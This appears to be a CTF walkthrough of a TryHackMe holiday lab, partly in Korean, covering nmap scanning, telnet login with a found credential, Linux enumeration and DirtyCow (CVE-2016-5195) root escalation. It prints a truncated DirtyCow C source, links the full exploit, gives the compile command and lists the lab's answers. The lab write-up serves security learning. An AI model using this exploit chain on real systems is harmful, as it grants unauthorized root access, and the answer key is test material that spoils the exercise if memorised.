# Day 13 | Networking Coal for Christmas

## Workstation
- Virtual Box : VMware Fusion 12.1.2
- OS : kali-linux-2021.2

## Walkthrough
![attackbox](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/25%20Days%20of%20Cyber%20Security/Day%2013/image/attackbox.png)

Hi Santa, hop in your sleigh and deploy this machine!

The Christmas GPS now says this house is at the address 10.10.214.198. Scan this machine with a port-scanning tool of your choice.

#### Port Scanning

We will begin by scanning the machine. If you are working from the TryHackMe "Attackbox" or from a Kali Linux instance (or honestly, any Linux distribution where you have this installed), you can use nmap with syntax like so:

`nmap 10.10.214.198`

What old, deprecated protocol and service is running?

> telnet

![nmap](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/25%20Days%20of%20Cyber%20Security/Day%2013/image/nmap.png)

#### Initial Access

Connect to this service to see if you can make use of it. You can connect to the service with the standard command-line client, named after the name of the service, or netcat with syntax like this:

`telnet 10.10.214.198 <PORT_FROM_NMAP_SCAN>`

What credential was left for you?

> clauschristmas

![telnet](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/25%20Days%20of%20Cyber%20Security/Day%2013/image/telnet.png)

#### Enumeration

Looks like you can slide right down the chimney! Log in and take a look around, enumerate a bit. You can view files and folders in the current directory with ls, change directories with cd and view the contents of files with cat.

Often to enumerate you want to look at pertinent system information, like the version of the operating system or other release information. You can view some information with commands like this:

`cat /etc/*release`

`uname -a`

`cat /etc/issue`

There is a great list of commands you can run for enumeration here: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

What distribution of Linux and version number is this server running?

> ubuntu 12.04

![cat](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/25%20Days%20of%20Cyber%20Security/Day%2013/image/cat.png)

This is a very old version of Linux! This may be vulnerable to some kernel exploits, that we could use to escalate our privileges.

Take a look at the cookies and milk that the server owners left for you. You can do this with the cat command as mentioned earlier.

cat cookies_and_milk.txt

Who got here first?

> Grinch

```
$ cat cookies_and_milk.txt
/*************************************************
// HAHA! Too bad Santa! I, the Grinch, got here 
// before you did! I helped myself to some of
// the goodies here, but you can still enjoy
// some half eaten cookies and this leftover
// milk! Why dont you try and refill it yourself!
//   - Yours Truly,
//         The Grinch
//*************************************************/

#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

const char *filename = "/etc/passwd";
const char *backup_filename = "/tmp/passwd.bak";
const char *salt = "grinch";

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

struct Userinfo {
   char *username;
   char *hash;
   int user_id;
   int group_id;
   char *info;
   char *home_dir;
   char *shell;
};

char *generate_password_hash(char *plaintext_pw) {
  return crypt(plaintext_pw, salt);
}

char *generate_passwd_line(struct Userinfo u) {
  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
  int size = snprintf(NULL, 0, format, u.username, u.hash,
    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
  char *ret = malloc(size + 1);
  sprintf(ret, format, u.username, u.hash, u.user_id,
    u.group_id, u.info, u.home_dir, u.shell);
  return ret;
}

void *madviseThread(void *arg) {
  int i, c = 0;
  for(i = 0; i < 200000000; i++) {
    c += madvise(map, 100, MADV_DONTNEED);
  }
  printf("madvise %d\n\n", c);
}

int copy_file(const char *from, const char *to) {
  // check if target file already exists
  if(access(to, F_OK) != -1) {
    printf("File %s already exists! Please delete it and run again\n",
      to);
    return -1;
  }

  char ch;
  FILE *source, *target;

  source = fopen(from, "r");
  if(source == NULL) {
    return -1;
  }
  target = fopen(to, "w");
  if(target == NULL) {
     fclose(source);
     return -1;
  }

  while((ch = fgetc(source)) != EOF) {
     fputc(ch, target);
   }

  printf("%s successfully backed up to %s\n",
    from, to);

  fclose(source);
  fclose(target);

  return 0;
}

int main(int argc, char *argv[])
{
  // backup file
  int ret = copy_file(filename, backup_filename);
  if (ret != 0) {
    exit(ret);
  }

  struct Userinfo user;
  // set values, change as needed
  user.username = "grinch";
  user.user_id = 0;
  user.group_id = 0;
  user.info = "pwned";
  user.home_dir = "/root";
  user.shell = "/bin/bash";

}

/*************************************************
// HAHA! Too bad Santa! I, the Grinch, got here 
// before you did! I helped myself to some of
// the goodies here, but you can still enjoy
// some half eaten cookies and this leftover
// milk! Why dont you try and refill it yourself!
//   - Yours Truly,
//         The Grinch
//*************************************************/
```

The perpetrator took half of the cookies and milk! Weirdly enough, that file looks like C code...

That C source code is a portion of a kernel exploit called DirtyCow. Dirty COW (CVE-2016-5195) is a privilege escalation vulnerability in the Linux Kernel, taking advantage of a race condition that was found in the way the Linux kernel's memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system.

You can learn more about the DirtyCow exploit online here: https://dirtycow.ninja/

This cookies_and_milk.txt file looks like a modified rendition of a DirtyCow exploit, usually written in C. Find a copy of that original file online, and get it on the target box. You can do this with some simple file transfer methods like netcat, or spinning up a quick Python HTTP server... or you can simply copy-and-paste it into a text editor on the box!

cookies_and_milk.txt 파일이 실행파일 같이 보여 해당 파일을 C 파일로 변환시켜 `gcc` 명령어로 컴파일시켜 실행시키니 `char *generate_password_hash(char *plaintext_pw)` 함수가 이상하다고 나온다. 해당 함수를 검색해보면 아래 사이트에서 코드를 얻을 수 있다.

https://github.com/FireFart/dirtycow/blob/master/dirty.c

![cp](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/25%20Days%20of%20Cyber%20Security/Day%2013/image/cp.png)

You can compile the C source code on the target with gcc. You might need to supply specific parameters or arguments to include different libraries, but thankfully, the DirtyCow source code will explain what syntax to use.

What is the verbatim syntax you can use to compile, taken from the real C source code comments?

> gcc -pthread dirty.c -o dirty -lcrypt

위 사이트 코드를 `nano` 편집기로 dirty.c 파일에 복사한 후 `gcc` 명령어로 컴파일한다.

![nano](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/25%20Days%20of%20Cyber%20Security/Day%2013/image/nano.png)

#### Privilege Escalation

Run the commands to compile the exploit, and run it.

What "new" username was created, with the default operations of the real C source code?

Switch your user into that new user account, and hop over to the /root directory to own this server!

You can switch user accounts like so:

su <user_to_change_to>

Uh oh, looks like that perpetrator left a message! Follow his instructions to prove you really did leave Coal for Christmas!

After you leave behind the coal, you can run tree | md5sum

What is the MD5 hash output?

> 8b16f00dd3b51efadb02c1df7f8427cc

컴파일한 파일 `dirty` 파일을 실행하면 새로운 암호를 지정할 수 있는데 엔터를 눌러 패스워드는 아무것도 지정하지 않는다.

위에서 알 수 있는 정보는 Username이 `firefart`라는 패스워드를 아무것도 지정하지 않은 것이다.

`su firefart`로 firefart 계정으로 접속한다.

![dirty](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/25%20Days%20of%20Cyber%20Security/Day%2013/image/dirty.png)

/root/ 디렉터리로 이동 후 리스트를 확인하면 coal 파일은 없다. coal 남겼다고 하니 `touch` 명령어로 파일을 생성 후 `tree | md5sum`를 실행하면 MD5 해쉬를 얻을 수 있다.

![md5](https://github.com/jasperkim425/Walkthrough/blob/main/TryHackMe/25%20Days%20of%20Cyber%20Security/Day%2013/image/md5.png)
